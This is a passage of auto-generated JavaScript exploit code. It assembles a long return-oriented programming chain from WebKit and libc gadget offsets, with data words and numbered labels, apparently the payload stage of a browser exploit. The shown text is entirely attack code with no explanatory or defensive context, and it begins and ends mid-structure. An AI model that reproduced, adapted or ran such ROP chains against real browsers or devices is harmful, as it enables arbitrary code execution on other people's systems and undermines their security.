webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1299:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+115272, //L1300
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1300:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1301:
db([27, 0]); // 0x1b
set_gadget(libc_base+792472,); //pop rcx
//L1302:
db([8, 0]); // 0x8
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+115376, //L1303
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+115392, //L1304
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1303:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1304:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+115480, //L1305
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1305:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+115536, //L1308
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1308:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+115608, //L1309
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1309:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+115664, //L1312
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1312:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+115768, //L1315
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L1314:
db([4294967288, 4294967295]); // -0x8
set_gadget(libc_base+792472,); //pop rcx
//L1315:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+115856, //L1316
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+115872, //L1318
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1316:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1318:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+116016, //L1321
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+115984, //L1319
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+116000, //L1320
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1319:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1320:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1321:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+116088, //L1322
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1322:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+116144, //L1325
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1325:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+116224, //L1326
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1326:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1327:
db([3, 0]); // 0x3
set_gadget(libc_base+792472,); //pop rcx
//L1328:
db([8, 0]); // 0x8
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+116328, //L1329
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+116344, //L1330
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1329:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1330:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+877175, //sub rax, rcx ; sbb rdx, rcx
libc_base+793877, //pop rsi
ropchain+116432, //L1331
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1331:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+116488, //L1334
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1334:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+116608, //L1337
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L1336:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L1337:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+116696, //L1338
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+116712, //L1340
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1338:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1340:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+116856, //L1343
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+116824, //L1341
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+116840, //L1342
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1341:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1342:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1343:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+116928, //L1344
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1344:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+116984, //L1347
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1347:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+117064, //L1348
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1348:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1349:
db([28, 0]); // 0x1c
set_gadget(libc_base+792472,); //pop rcx
//L1350:
db([8, 0]); // 0x8
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+117168, //L1351
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+117184, //L1352
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1351:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1352:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+117272, //L1353
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1353:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+117328, //L1356
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1356:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+117400, //L1357
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1357:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+117456, //L1360
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1360:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
//L1361:
webkit_base+1026352, //mov [rdi + 0x10], r9
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+117608, //L1364
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L1363:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L1364:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+117696, //L1365
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+117712, //L1367
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1365:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1367:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+117856, //L1370
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+117824, //L1368
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+117840, //L1369
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1368:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1369:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1370:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+117928, //L1371
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1371:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+117984, //L1374
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1374:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+118064, //L1375
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1375:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1376:
db([29, 0]); // 0x1d
set_gadget(libc_base+792472,); //pop rcx
//L1377:
db([8, 0]); // 0x8
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+118168, //L1378
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+118184, //L1379
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1378:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1379:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+118272, //L1380
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1380:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+118328, //L1383
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1383:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+118400, //L1384
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1384:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+118456, //L1387
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1387:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
//L1388:
libc_base+206806, //pop rdi
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+118608, //L1391
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L1390:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L1391:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+118696, //L1392
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+118712, //L1394
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1392:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1394:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+118856, //L1397
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+118824, //L1395
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+118840, //L1396
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1395:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1396:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1397:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+118928, //L1398
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1398:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+118984, //L1401
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1401:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+119064, //L1402
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1402:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1403:
db([30, 0]); // 0x1e
set_gadget(libc_base+792472,); //pop rcx
//L1404:
db([8, 0]); // 0x8
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+119168, //L1405
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+119184, //L1406
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1405:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1406:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+119272, //L1407
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1407:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+119328, //L1410
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1410:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+119400, //L1411
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1411:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+119456, //L1414
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1414:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+119560, //L1417
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L1416:
db([4294967288, 4294967295]); // -0x8
set_gadget(libc_base+792472,); //pop rcx
//L1417:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+119648, //L1418
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+119664, //L1420
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1418:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1420:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+119808, //L1423
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+119776, //L1421
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+119792, //L1422
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1421:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1422:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1423:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+119880, //L1424
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1424:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+119936, //L1427
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1427:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+120016, //L1428
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1428:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1429:
db([7, 0]); // 0x7
set_gadget(libc_base+792472,); //pop rcx
//L1430:
db([8, 0]); // 0x8
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+120120, //L1431
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+120136, //L1432
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1431:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1432:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+877175, //sub rax, rcx ; sbb rdx, rcx
libc_base+793877, //pop rsi
ropchain+120224, //L1433
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1433:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+120280, //L1436
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1436:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+120400, //L1439
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L1438:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L1439:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+120488, //L1440
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+120504, //L1442
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1440:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1442:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+120648, //L1445
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+120616, //L1443
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+120632, //L1444
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1443:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1444:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1445:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+120720, //L1446
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1446:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+120776, //L1449
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1449:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+120856, //L1450
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1450:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1451:
db([31, 0]); // 0x1f
set_gadget(libc_base+792472,); //pop rcx
//L1452:
db([8, 0]); // 0x8
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+120960, //L1453
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+120976, //L1454
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1453:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1454:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+121064, //L1455
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1455:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+121120, //L1458
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1458:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+121192, //L1459
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1459:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+121248, //L1462
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1462:
db([0, 0]); // 0x0
set_gadgets([
